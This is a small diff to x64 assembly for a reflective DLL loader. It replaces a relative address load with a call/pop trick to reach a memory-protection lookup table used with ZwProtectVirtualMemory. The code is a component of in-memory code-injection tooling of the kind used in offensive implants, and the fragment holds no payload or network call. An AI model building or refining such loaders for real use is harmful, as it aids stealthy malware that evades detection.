@@ -596,13 +596,10 @@ ReflectiveLoader:
     and     eax, 0x7                   ; 3-bit index: XRW
 
     ; inline lookup: 3-bit index -> Windows memory protection constant
-    lea     rbx, [rel .prot_table]
+    jmp     .prot_table
+.got_prot_table:
+    pop     rbx
     movzx   ebx, byte [rbx + rax]     ; ebx = NewProtect
-    jmp     .do_protect
-.prot_table:
-    ;       ---   X     R     XR    W     XW    RW    XRW
-    db      0x01, 0x10, 0x02, 0x20, 0x04, 0x40, 0x04, 0x40
-.do_protect:
 
     ; ZwProtectVirtualMemory(-1, &BaseAddr, &RegionSize, NewProtect, &OldProtect)
     sub     rsp, 0x48
@@ -731,3 +728,7 @@ ReflectiveLoader:
     jmp     .hfn_loop
 .hfn_done:
     ret
+.prot_table:
+    call .got_prot_table
+    ;       ---   X     R     XR    W     XW    RW    XRW
+    db      0x01, 0x10, 0x02, 0x20, 0x04, 0x40, 0x04, 0x40
